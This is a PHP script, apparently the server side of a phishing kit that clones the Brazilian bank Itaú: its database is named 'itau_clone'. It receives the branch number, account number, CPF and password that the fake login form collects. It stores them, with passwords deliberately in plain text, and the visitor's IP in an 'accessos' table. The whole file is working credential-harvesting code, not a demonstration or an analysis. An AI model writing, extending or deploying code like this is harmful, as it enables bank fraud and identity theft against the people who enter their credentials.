<?php
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');
ini_set('display_errors', 0);
error_reporting(E_ALL);

/* ---------------- CONFIGURAÇÃO ---------------- */
$DB_HOST = 'localhost';
$DB_NAME = 'itau_clone';
$DB_USER = 'root';
$DB_PASS = '';
$DB_CHARSET = 'utf8mb4';

/* arquivo de log temporário para debugging local */
$logFile = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'save_php_debug.log';
function log_debug(string $msg){
    global $logFile;
    @file_put_contents($logFile, date('[Y-m-d H:i:s] ') . $msg . PHP_EOL, FILE_APPEND | LOCK_EX);
}
function respond(int $code, array $payload){
    http_response_code($code);
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

/* ---------------- CONEXÃO ---------------- */
$dsn = "mysql:host={$DB_HOST};dbname={$DB_NAME};charset={$DB_CHARSET}";
$options = [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES => false,
];

try {
    $pdo = new PDO($dsn, $DB_USER, $DB_PASS, $options);
} catch (PDOException $e) {
    log_debug("CONNECT ERROR: " . $e->getMessage());
    respond(500, ['success' => false, 'error' => 'DB connection failed', 'detail' => $e->getMessage()]);
}

/* ---------------- GARANTE TABELA (pode rodar toda requisição) ----------------
   Nota: a tabela tem coluna senha_hash — vamos reutilizar esse campo para salvar
   a senha em texto puro conforme pedido (nome da coluna mantido para compatibilidade).
*/
try {
    $createSql = "
    CREATE TABLE IF NOT EXISTS accessos (
      id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
      agencia VARCHAR(32) DEFAULT NULL,
      conta VARCHAR(64) DEFAULT NULL,
      cpf VARCHAR(20) DEFAULT NULL,
      senha_hash TEXT DEFAULT NULL,
      ip VARCHAR(45) DEFAULT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    ";
    $pdo->exec($createSql);
} catch (PDOException $e) {
    log_debug("CREATE TABLE ERROR: " . $e->getMessage());
    respond(500, ['success' => false, 'error' => 'Table creation failed', 'detail' => $e->getMessage()]);
}

/* ---------------- LÊ PAYLOAD (form ou JSON) ---------------- */
$raw = $_POST;
if (empty($raw)) {
    $body = file_get_contents('php://input');
    $json = json_decode($body, true);
    if (is_array($json)) $raw = array_merge($raw, $json);
}

/* Campos aceitos (tolerante aos nomes usados no front) */
$agencia_menu  = trim((string)($raw['agencia_menu'] ?? ''));
$conta_menu    = trim((string)($raw['conta_menu'] ?? ''));
$agencia_modal = trim((string)($raw['agencia_modal'] ?? ''));
$conta_modal   = trim((string)($raw['conta_modal'] ?? ''));
$cpf_raw       = trim((string)($raw['cpf'] ?? $raw['cpf_modal'] ?? $raw['cpf_input'] ?? ''));
$password_raw  = trim((string)($raw['password'] ?? $raw['senha'] ?? $raw['senha_plain'] ?? ''));

/* Decide agência/conta: prefer menu, depois modal */
$ag_raw = $agencia_menu !== '' ? $agencia_menu : $agencia_modal;
$co_raw = $conta_menu   !== '' ? $conta_menu   : $conta_modal;

/* normalization helpers */
function onlyDigits(string $s): string { return preg_replace('/\D/','',$s) ?? ''; }
/* Conta pode ter hífen — mantemos hífen se houver */
function cleanConta(string $s): string { return preg_replace('/[^\d\-]/', '', $s); }

/* prepara valores para salvar (NULL quando vazio) */
$agencia_db = $ag_raw !== '' ? onlyDigits($ag_raw) : null;
$conta_db   = $co_raw  !== '' ? cleanConta($co_raw) : null;
$cpf_db     = $cpf_raw !== '' ? onlyDigits($cpf_raw) : null;

/* a senha será salva em texto puro conforme solicitado; se vazia -> NULL */
$senha_db = $password_raw !== '' ? $password_raw : null;

/* IP */
$ip = $_SERVER['REMOTE_ADDR'] ?? null;

/* ---------------- VALIDAÇÃO LEVE (aceita campos vazios) ---------------- */
$errors = [];
if ($cpf_db !== null && strlen($cpf_db) !== 11) $errors[] = 'CPF inválido (quando informado deve ter 11 dígitos).';
if ($agencia_db !== null && strlen($agencia_db) > 10) $errors[] = 'Agência inválida (muito longa).';
if ($conta_db !== null && strlen(onlyDigits($conta_db)) > 20) $errors[] = 'Conta inválida (muito longa).';

if (!empty($errors)) {
    log_debug("VALIDATION FAILED: " . json_encode($errors) . " payload: " . json_encode($raw));
    respond(400, ['success' => false, 'error' => 'Validação falhada', 'errors' => $errors, 'received' => $raw]);
}

/* ---------------- INSERT (sempre novo registro) ---------------- */
try {
    $sql = "INSERT INTO accessos (agencia, conta, cpf, senha_hash, ip) VALUES (:agencia, :conta, :cpf, :senha, :ip)";
    $stmt = $pdo->prepare($sql);
    // bindValue para permitir NULL
    $stmt->bindValue(':agencia', $agencia_db, $agencia_db === null ? PDO::PARAM_NULL : PDO::PARAM_STR);
    $stmt->bindValue(':conta',   $conta_db,   $conta_db   === null ? PDO::PARAM_NULL : PDO::PARAM_STR);
    $stmt->bindValue(':cpf',     $cpf_db,     $cpf_db     === null ? PDO::PARAM_NULL : PDO::PARAM_STR);
    $stmt->bindValue(':senha',   $senha_db,   $senha_db   === null ? PDO::PARAM_NULL : PDO::PARAM_STR); // SALVA EM TEXTO PURO
    $stmt->bindValue(':ip',      $ip,         $ip         === null ? PDO::PARAM_NULL : PDO::PARAM_STR);
    $stmt->execute();

    $newId = (int)$pdo->lastInsertId();
    log_debug("INSERT OK id={$newId} payload: " . json_encode(['ag'=>$agencia_db,'co'=>$conta_db,'cpf'=>$cpf_db,'has_senha'=>($senha_db!==null)]));
    respond(200, ['success' => true, 'created' => true, 'id' => $newId]);
} catch (PDOException $e) {
    $err = $e->getMessage();
    $info = $e->errorInfo ?? null;
    log_debug("INSERT ERROR: " . $err . " | errorInfo: " . json_encode($info) . " payload: " . json_encode(['ag'=>$agencia_db,'co'=>$conta_db,'cpf'=>$cpf_db,'has_senha'=>($senha_db!==null)]));
    respond(500, ['success' => false, 'error' => 'DB insert failed', 'detail' => $err, 'errorInfo' => $info]);
}
